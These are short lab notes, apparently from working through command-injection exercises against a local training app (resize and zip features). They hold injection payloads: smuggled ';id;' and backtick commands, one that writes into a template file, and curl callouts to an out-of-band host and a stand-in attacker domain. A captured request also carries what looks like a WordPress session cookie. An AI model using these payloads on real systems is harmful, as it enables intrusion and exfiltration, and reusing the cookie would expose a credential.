# Lab 1
- we in lab resizing a image
- ![[skf-lab1-1.png]]
- let's go see packet
- ![[skf-lab1-2.png]]
```http
POST /home HTTP/1.1
Host: 127.0.0.1:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 7
Origin: http://127.0.0.1:5000
Connection: keep-alive
Referer: http://127.0.0.1:5000/home
Cookie: wordpress_logged_in_5c016e8f0f95f039102cbe8366c5c7f3=salar%7C1738426858%7C9XvMuDG4HIWntaNkPq99mJMyTQK9oxrLcPyn7vEDKyO%7C144626f650db871bb0c719b4da10d34d881c4c3a0dc6e3d346e08b12e3804d45; wp-settings-time-1=1737215777; wp-settings-1=mfold%3Do
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i

size=50
```
- The input we give to the application here is  `size`
- We assume that the application uses the `convert` command.
- `convert path -resize `
- payload's
```shell
echo `id` >> templates/index.html
curl http://9v5hvo5p57s8akbk74qdfpmbk2qtej28.oastify.com;
```
- ![[skf-lab1-4.png]]



## Laboratory 2
- we in lab compressing a file
- ![[skf-lab2-1.png]]
- We imagine a zip command being called in the background.
- testing payload's
```shell
;echo 1;
;whomai;
;id;
;curl%20attcker.com;

```
- ![[skf-lab2-3.png]]
## [lab3](https://skf.gitbook.io/asvs-write-ups/command-injection-4-cmd-4/cmd4) Read writeup 
## [lab5 blind](https://skf.gitbook.io/asvs-write-ups/command-injection-blind-cmd-blind/blind-cmd-injection-1) read writeup 
